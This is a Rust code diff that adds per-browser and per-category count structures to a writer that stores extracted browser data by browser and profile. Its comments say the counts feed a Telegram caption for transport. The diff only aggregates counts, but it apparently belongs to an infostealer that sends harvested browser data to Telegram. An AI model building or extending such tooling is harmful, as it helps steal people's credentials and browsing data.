@@ -130,6 +130,29 @@ pub struct Acc {
     data: BrowserData,
 }
 
+/// One browser's aggregate counts (feeds the per-browser Telegram breakdown).
+#[derive(Debug, Clone, Default)]
+pub struct BrowserStats {
+    pub name: String,
+    pub entries: usize,
+    pub files: usize,
+    pub profiles: usize,
+    /// Per-category totals for this browser (first-seen order).
+    pub categories: Vec<(String, usize)>,
+}
+
+/// Counts produced by a [`Writer::write`] pass — feeds the Telegram caption.
+#[derive(Debug, Clone, Default)]
+pub struct WriteReport {
+    pub entries: usize,
+    pub files: usize,
+    pub profiles: usize,
+    /// Per-category totals (order: first-seen, i.e. Go's category order).
+    pub categories: Vec<(String, usize)>,
+    /// Per-browser breakdown (order: first-seen / Go's discovery order).
+    pub browsers: Vec<BrowserStats>,
+}
+
 /// One (browser, profile) group with per-category non-empty rows.
 struct Group {
     browser: String,
@@ -167,7 +190,8 @@ impl Writer {
 
     /// Aggregates per (browser, profile) and writes each non-empty category
     /// to `<dir>/<browser>/<profile>/<category>.<ext>` (Go: `Write`).
-    pub fn write(&mut self) -> Result<(), OutputError> {
+    /// Returns a [`WriteReport`] with the totals (for transport/caption).
+    pub fn write(&mut self) -> Result<WriteReport, OutputError> {
         fs::create_dir_all(&self.dir).map_err(|e| OutputError::io("create output dir", e))?;
 
         // Per (browser, profile) summary: category → entry count.
@@ -187,7 +211,7 @@ impl Writer {
             }
         }
         if summaries.is_empty() {
-            return Ok(());
+            return Ok(WriteReport::default());
         }
 
         // One line per profile with per-category counts, then a total line.
@@ -211,7 +235,50 @@ impl Writer {
             files,
             summaries.len()
         );
-        Ok(())
+
+        // Aggregate per-category totals across profiles (first-seen order).
+        let mut ordered: Vec<(String, usize)> = Vec::new();
+        for (_, cat_counts) in &summaries {
+            for (name, n) in cat_counts {
+                match ordered.iter_mut().find(|(c, _)| c == name) {
+                    Some((_, total)) => *total += n,
+                    None => ordered.push((name.clone(), *n)),
+                }
+            }
+        }
+
+        // Group the same summaries per browser (rel = "browser/profile").
+        let mut browsers: Vec<BrowserStats> = Vec::new();
+        for (rel, cat_counts) in &summaries {
+            let name = rel.split('/').next().unwrap_or("?").to_string();
+            let bs = match browsers.iter_mut().find(|b| b.name == name) {
+                Some(b) => b,
+                None => {
+                    browsers.push(BrowserStats {
+                        name: name.clone(),
+                        ..Default::default()
+                    });
+                    browsers.last_mut().expect("just pushed")
+                }
+            };
+            bs.profiles += 1;
+            bs.files += cat_counts.len();
+            bs.entries += cat_counts.iter().map(|(_, n)| n).sum::<usize>();
+            for (cat, n) in cat_counts {
+                match bs.categories.iter_mut().find(|(c, _)| c == cat) {
+                    Some((_, total)) => *total += n,
+                    None => bs.categories.push((cat.clone(), *n)),
+                }
+            }
+        }
+
+        Ok(WriteReport {
+            entries,
+            files,
+            profiles: summaries.len(),
+            categories: ordered,
+            browsers,
+        })
     }
 
     fn aggregate(&self) -> Vec<Group> {
